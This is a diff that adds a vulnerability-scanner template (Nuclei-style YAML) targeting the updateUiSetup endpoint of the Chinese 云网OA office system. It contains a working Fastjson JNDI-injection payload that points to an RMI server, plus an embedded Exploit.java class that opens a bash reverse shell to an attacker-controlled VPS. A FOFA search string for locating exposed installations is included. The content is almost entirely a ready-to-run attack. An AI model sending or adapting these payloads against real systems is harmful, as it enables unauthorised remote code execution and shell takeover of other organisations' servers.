@@ -1,0 +1,19 @@
+id: poc-herd31ateof5xywr
+info:
+  name: 云网OA updateUiSetup存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/herd31ateof5xywr'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: herd31ateof5xywr
+    fofa: body="云网OA"
+http:
+- raw:
+  - "POST /oa//setup/updateUiSetup HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: skincode=lte; name=admin; pwd=; JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\nuiSetup={\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://${Dnslog}$/Exploit\", \"autoCommit\":true}}\n\n文件定位：\nExploit.java\n\npublic class Exploit {\n    public Exploit(){\n        try {\n            java.lang.Runtime.getRuntime().exec(\n                    new String[]{\"bash\", \"-c\", \"bash -i >& /dev/tcp/VPS地址/12345 0>&1\"});\n        }\n        catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] argv){\n        Exploit e = new Exploit();\n    }\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
